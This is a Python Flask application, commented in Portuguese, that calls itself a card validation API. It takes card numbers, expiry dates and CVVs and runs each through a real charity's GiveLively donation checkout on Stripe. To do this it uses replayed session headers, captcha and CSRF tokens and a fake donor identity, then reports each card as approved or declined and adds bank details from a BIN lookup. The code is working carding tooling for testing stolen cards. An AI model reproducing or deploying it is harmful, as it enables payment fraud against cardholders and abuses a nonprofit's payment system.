from flask import Flask, request, jsonify
import requests
import re
import logging
from datetime import datetime

app = Flask(__name__)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CreditCardProcessor:
    def __init__(self):
        self.bin_database = {
            '536100': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'DEBIT', 'brand': 'MASTERCARD'},
            '411111': {'bank': 'Citibank', 'country': 'US', 'type': 'CREDIT', 'brand': 'VISA'},
            '511591': {'bank': 'Capital One', 'country': 'US', 'type': 'CREDIT', 'brand': 'MASTERCARD'},
            '401288': {'bank': 'Bank of America', 'country': 'US', 'type': 'CREDIT', 'brand': 'VISA'},
            '371449': {'bank': 'American Express', 'country': 'US', 'type': 'CREDIT', 'brand': 'AMEX'},
            '601100': {'bank': 'Discover', 'country': 'US', 'type': 'CREDIT', 'brand': 'DISCOVER'},
            '516320': {'bank': 'Wells Fargo', 'country': 'US', 'type': 'CREDIT', 'brand': 'MASTERCARD'},
            '453211': {'bank': 'HSBC', 'country': 'US', 'type': 'CREDIT', 'brand': 'VISA'},
        }
    
    def get_bin_info(self, cc_number):
        """Extrai informações do BIN (Bank Identification Number)"""
        bin_code = cc_number[:6]
        return self.bin_database.get(bin_code, {
            'bank': 'Unknown Bank', 
            'country': 'Unknown', 
            'type': 'UNKNOWN', 
            'brand': self.detect_brand(cc_number)
        })
    
    def detect_brand(self, cc_number):
        """Detecta a bandeira do cartão"""
        if cc_number.startswith('4'):
            return 'VISA'
        elif cc_number.startswith(('51', '52', '53', '54', '55')):
            return 'MASTERCARD'
        elif cc_number.startswith(('34', '37')):
            return 'AMEX'
        elif cc_number.startswith('6011'):
            return 'DISCOVER'
        else:
            return 'UNKNOWN'

class PaymentGateway:
    def __init__(self):
        self.stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        self.givelively_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'baggage': 'sentry-environment=production,sentry-release=13c158356fa720645965d3fd3988305afd2e9d27,sentry-public_key=566034783d2d45de86e5217dc9b8b1e4,sentry-trace_id=f44524589f13490fab92d482f274cea9,sentry-sample_rate=0.035,sentry-sampled=false',
            'content-type': 'application/json',
            'origin': 'https://secure.givelively.org',
            'priority': 'u=1, i',
            'referer': 'https://secure.givelively.org/donate/echoing-green-foundation/cart/ebadb1fa-9fdd-47f6-8ab8-1441e93138db/payment-details',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sentry-trace': 'f44524589f13490fab92d482f274cea9-934948133830f681-0',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': 'N2sXfULlBFQzBu9aBdcx18_N00Pv1zBTeZhfGCflexChJ3ileDJYTjnryfXp0AmrEMQlqGnTUgDbdNSK69vZRA',
            'x-datadome-clientid': 'zpOjHyESKEFbagwFilkewMxveqCs6NILuNmjOVBAyOrJmaOzWiiOvy_fsuAtdBTzFf0IXiGrtAfeWQlaTaTpE4SFY0gxmUXXFSz96xDQFFtGRWKUPeJYVpjdOPuZUaqa',
        }

    def validate_cc_format(self, cc, mm, yy, cvv):
        """Valida o formato dos dados do cartão"""
        if not re.match(r'^\d{13,19}$', cc):
            return False, "Número do cartão inválido"
        if not re.match(r'^\d{2}$', mm) or not (1 <= int(mm) <= 12):
            return False, "Mês de expiração inválido"
        if not re.match(r'^\d{2,4}$', yy):
            return False, "Ano de expiração inválido"
        if not re.match(r'^\d{3,4}$', cvv):
            return False, "CVV inválido"
        return True, "OK"

    def process_payment(self, cc, mm, yy, cvv):
        """Processa o pagamento através do Stripe e GiveLively"""
        try:
            # Validar formato
            is_valid, message = self.validate_cc_format(cc, mm, yy, cvv)
            if not is_valid:
                return {
                    'status': 'declined',
                    'http_status': 400,
                    'message': message,
                    'timestamp': datetime.now().isoformat()
                }

            # Primeira etapa - Stripe
            stripe_data = f'type=card&billing_details[name]=Adam+Philips+&billing_details[email]=tutaloucome7%40gmail.com&billing_details[address][postal_code]=10011&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=193fcf3e-430c-4453-8839-d7d6d7009fc9ec6f96&muid=8e8b8bba-b434-4865-aa73-178d73596890c9849f&sid=77a0cea6-4990-47b7-a84d-ad5e5cfd21f37dc2bc&pasted_fields=number&payment_user_agent=stripe.js%2F1816959ce9%3B+stripe-js-v3%2F1816959ce9%3B+card-element&referrer=https%3A%2F%2Fsecure.givelively.org&time_on_page=108173&client_attribution_metadata[client_session_id]=8eb497f8-4a09-4f85-9d09-bf21c25746a1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYwNTU3NDA4LCJjZGF0YSI6IlhkTkwxOC9leXpWSitVdWIxaXAxZTBzbXlSeXhyVkpydG0ra2Rad1pXWGsxbWRBSDN5UW9pWEpPOFhTdFordExQVXB0a2RKSStmWEwxbDdLQzJoWEIzNlR1ejlaNXV4RXNrU21QcitOdkNYQS9KN3JURTB2ZW1iWWJVRVhTY29vVERvd25jMWJKdnZPWFd2UTlDcW5YMDA3alhHZHVFNXBTWVcwWVc1ei9odU4xV0hGQU51UE1ibStidXFYZWY4aHFybUNuUHlzTlJMUFVvZk0iLCJwYXNza2V5IjoiUVJDSWpkSm9iZk1YM0JScGVJSmZtWHEvWmo5YnN4bkViSEdNRGFackpvZytOOG11QVhIRkk0V3g5QURVZzZqTTkreWFPbmVzWWpOaUtqUEM3MGdTVHFyQXJMdkJFSUdRNSt4U0YwWER0b0pLTFM2b3BXVTJkQ1gyVlhGbWVWUnYrZzJsK0NCTGJjMTQ4Z2tDUkxMVW9zUU1FdUppTUE5M1ZqdEYrZUZ0U1NLeWVHSFRhb1pGZUM1SmRLVlpHeTQ5MTVacis1MW9lQmlEa2ZCQXdPRWNPd0xqbG0wQmo2QnNUdSttOWt2MDI0Skk1SGxGbVlKWVc4OTVOZjBsa0JjaW45TzVTUUpjSWJqSjZuaDNtM0hNQkZTMFNya25sNmo1dWk1UnJ2YnRtZ2hRamF4SUNGeDN1YXZEZHg0YjlnRWhDM3pPRTk4bXNDOGx1UHlaYTJhL2ZodmhlUTYyMUpLbndJWW5rQittbUxyZDlhenhYeHM4aG9vc2VGTmhobDBoYzdzTVNKTFBmNmpZeFU3bVZkcm5CbE1zUWN5ck83VW5FaTNFSDh6RTJSMGtmYjZxQ01wU0o2djBST0g4OUYvN1Y3OG5oSkMwQ0ZCTjhleUhlOGQyWWgvRndxVStnbG41bi8yMlVhVlhMc09LYjFqZEVHbTFjbUtYT1ZlZUFjY085eWlIejVUeU1lZTMzYzVwdnpzbEVlK1ZIOVBEaGtaUHdwQTBZSzlua2szMHd0NS9FQUk3c2dtUkpBbDFaMllsU3plZnZUMG1YRHRGcllOeVBaZGhnbjQ2UTBwQk12d3pISm5LcFdtWDlHczdDMzh5S3lyMUpZWWo3cXh1eDI4RWF3T1JTamJtbWJFWjdJN09XSkRVUVVEazFXWEJsd3RLaHZtdmI0K2FaN3NrRC95SlNXcUw0WDk3bklINStkbnIyL0txMjBqSVErdUtXR3g0RStQaGFvalQ3cG1zYWZybmtDWjJkZGtZV1ZrNVI3RU12NnNjS0R4NWpQdzZmMFZhMnpFb2ZFZUpRK0NSeFNQSXJzYUJubUdPMWN1SG1jSmd4c1Z1aUthbHVtRm1NM2dnaU8rNUJwRWk3R0hiMHk4eUx1TWRYUTYxU0wzMmdVUTduVGdnMnhZaEY0dVROQzE0YVpiQ00rS3dmYWhCSEw5RGE2QWtlcWFZbitUQTFjWUJYK2FnbXJyUitIdm9wUmdPYlpCSUxtOU1JcFI0UGlaL3ZVZEtMUEtlc1dsNzMyMnZhTUV0YzdjY0hvUjU0WFR4bDFSeFl6NkpPOU00Q0FiWE94cFhoVjBQZFljQlpwZzVtR2tPbHRmWkk4bG1aRVZaUGduZ1IxS1lOYkVvL3dzcWpXcGxOZXJsY3JEUFBmMlV1cTg1MHhML0FMd1hSM0t6L1BPUHNoL1BXVWZqRFNUWFkwT3lmSzMvamxZYUdvS2xmd1lRZk5aWFFEeSt0ZlA2TndKWEVWQ21KUnFoQUE0N0hNT0JSRUY1RmtyTHBSUGVwVGNIdGRXOGxicWRiWTcyV2xzRzd5U2dtZ0VyUjlxaGFYbnJRemlER1NDRTZvb3FyTHZzSE5hNUowOUdzOUZFQk5MeTVRelFGUEltdG1adHRCOGlPU0ljRjdVZWY1c212RjhheDRsc0JRNEYwYlYyejlJYXQwbk5SMGlmUVB1STlua3hLNUVGYTFjRXFQQm1FcGtaWFMwT2JUMGs5WCsrV2tGRTkyK2E3MG5oUy9uN0lPdStlZ0Z2a1lraVJLN1FWb2JUUFFBQm5tUzR6eGdoZnNOaFRoalRpMXZXY0k3ZzdYZnlQUkF2dXVWQkl2d29MYjBvQmFGckJMMHZjUFRSM3VnQU1KZEU0OU0rMm5ZeTkxeHBrZTNxUExkMTRDRXVhaTRVakZWTU1HUkdVZzBPMkJweE03S1Z6aExRYjh1UE9QTVZmOG5EcXZidTg4S0lycEt1Y3RJZ2JseXlFY3VXUFhHUDk2Vkd0M094Z053Zm5hbHlLS3RCUDdlSkttT2lpZ1NzYWNqVnh3MmhWQ0xSQW1scUNpRmR4Ly9PZmNxOHFscEt3UjdkTUFEbnhGZEJsdVZKYWNnR1k1dko2TnY5T2t4L25OQk1nNXMzVzE5WmVUbytoQlhLZm5jcUpaQ1laVnNPZE0yZ1RlTmJ4U1hoWDV2dUdjTEhBNEVQR1o1OGRsZHZlaE56WVh2U1NZUUREZ3BGSWc5VU00WENxMFpjYmFtVWdMQ3lqcDdlTUErM0RudCtuSTVKWUFDM09vYVpMSncwQ1BKVk5VeXl0dTA1NVdMMlZRPT0iLCJrciI6IjNlYzI4ZTY1Iiwic2hhcmRfaWQiOjMzOTUxMDMwM30.LzRmbVYwylIq_W7gzEU3jJMgtYorgfJkUJV1jH4euFI'

            stripe_response = requests.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=self.stripe_headers, 
                data=stripe_data,
                timeout=30
            )

            if stripe_response.status_code != 200:
                return {
                    'status': 'declined',
                    'http_status': stripe_response.status_code,
                    'message': 'Falha na validação do cartão',
                    'gateway_response': stripe_response.json() if stripe_response.text else {},
                    'timestamp': datetime.now().isoformat()
                }

            stripe_data_response = stripe_response.json()
            payment_method_id = stripe_data_response.get('id')

            # Segunda etapa - GiveLively
            givelively_data = {
                'checkout': {
                    'name': 'Adam Philips ',
                    'email': 'tutaloucome7@gmail.com',
                    'payment_method_id': payment_method_id,
                    'payment_method_type': 'mastercard',
                    'transaction_fee_covered': False,
                    'tip_amount': 0,
                    'order_tracking_attributes': {
                        'utm_source': None,
                        'widget_type': 'simple_donation',
                        'widget_url': 'https://echoinggreen.org/donate/',
                        'referrer_url': '',
                        'page_url': None,
                    },
                    'answers_attributes': [],
                },
                'anonymous_to_public': False,
                'donation_page_context_id': 'cf7a82ed-4823-485f-aaef-b9396acf8207',
                'donation_page_context_type': 'Nonprofit',
                'access_token': 'kC2snQXw72qhVsyahGBm4iMA2b3iQnz3LWdwrVtSiN4',
                'idempotency_key': 'ecde9336-9bc9-4e18-b8df-b4ddfc912b87',
            }

            givelively_response = requests.post(
                'https://secure.givelively.org/carts/ebadb1fa-9fdd-47f6-8ab8-1441e93138db/payment_intents/checkout',
                headers=self.givelively_headers,
                json=givelively_data,
                timeout=30
            )

            # Analisar resposta
            if givelively_response.status_code == 200:
                return {
                    'status': 'approved',
                    'http_status': 200,
                    'message': 'Transação aprovada',
                    'gateway_response': givelively_response.json(),
                    'timestamp': datetime.now().isoformat()
                }
            else:
                return {
                    'status': 'declined',
                    'http_status': givelively_response.status_code,
                    'message': 'Transação recusada',
                    'gateway_response': givelively_response.json() if givelively_response.text else {},
                    'timestamp': datetime.now().isoformat()
                }

        except requests.exceptions.Timeout:
            return {
                'status': 'declined',
                'http_status': 408,
                'message': 'Timeout na conexão',
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            logger.error(f"Erro no processamento: {str(e)}")
            return {
                'status': 'declined',
                'http_status': 500,
                'message': f'Erro interno: {str(e)}',
                'timestamp': datetime.now().isoformat()
            }

# Instâncias globais
cc_processor = CreditCardProcessor()
payment_gateway = PaymentGateway()

@app.route('/')
def home():
    return jsonify({
        'message': 'API de Validação de Cartões - Online',
        'version': '1.0.0',
        'status': 'active',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/check', methods=['POST'])
def check_card():
    """
    Endpoint para verificar cartão de crédito
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                'status': 'error',
                'message': 'Dados JSON necessários',
                'timestamp': datetime.now().isoformat()
            }), 400

        # Validar campos obrigatórios
        required_fields = ['cc', 'mm', 'yy', 'cvv']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    'status': 'error',
                    'message': f'Campo obrigatório faltando: {field}',
                    'timestamp': datetime.now().isoformat()
                }), 400

        cc = data['cc']
        mm = data['mm']
        yy = data['yy']
        cvv = data['cvv']

        # Obter informações do BIN
        bin_info = cc_processor.get_bin_info(cc)
        
        # Processar pagamento
        payment_result = payment_gateway.process_payment(cc, mm, yy, cvv)

        # Montar resposta completa
        response_data = {
            'card_info': {
                'bin': cc[:6],
                'brand': bin_info['brand'],
                'bank': bin_info['bank'],
                'country': bin_info['country'],
                'type': bin_info['type'],
                'first_6': cc[:6],
                'last_4': cc[-4:]
            },
            'transaction': payment_result,
            'timestamp': datetime.now().isoformat()
        }

        return jsonify(response_data), payment_result['http_status']

    except Exception as e:
        logger.error(f"Erro no endpoint: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'Erro interno do servidor',
            'timestamp': datetime.now().isoformat()
        }), 500

@app.route('/api/bin/<bin_code>', methods=['GET'])
def get_bin_info(bin_code):
    """
    Endpoint para obter informações do BIN
    """
    if not re.match(r'^\d{6}$', bin_code):
        return jsonify({
            'status': 'error',
            'message': 'BIN deve conter 6 dígitos',
            'timestamp': datetime.now().isoformat()
        }), 400

    bin_info = cc_processor.get_bin_info(bin_code + '000000')
    return jsonify({
        'bin': bin_code,
        'info': bin_info,
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
